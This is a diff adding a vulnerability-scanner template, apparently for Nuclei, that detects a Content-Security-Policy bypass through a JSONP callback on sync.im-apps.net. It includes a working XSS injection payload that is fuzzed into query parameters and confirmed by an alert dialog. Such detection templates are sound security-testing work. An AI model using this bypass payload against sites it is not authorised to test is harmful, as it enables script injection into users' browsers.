@@ -1,0 +1,55 @@
+id: im-apps-sync-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via IM Apps Sync
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,im-apps-sync
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "im-apps.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: im_apps_sync_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "im_apps_sync_csp_xss == true"
+# digest: 490a0046304402205cced51998ffcdf1e054facd03b6e0f2bdb5f6eb817039443aadcd74efbdb7c4022052152f3ccdd5100630c26e2194ea24d8067c862fd891d7e0fab022ffb64a6f79:922c64590222798bb761d5b6d8e72950
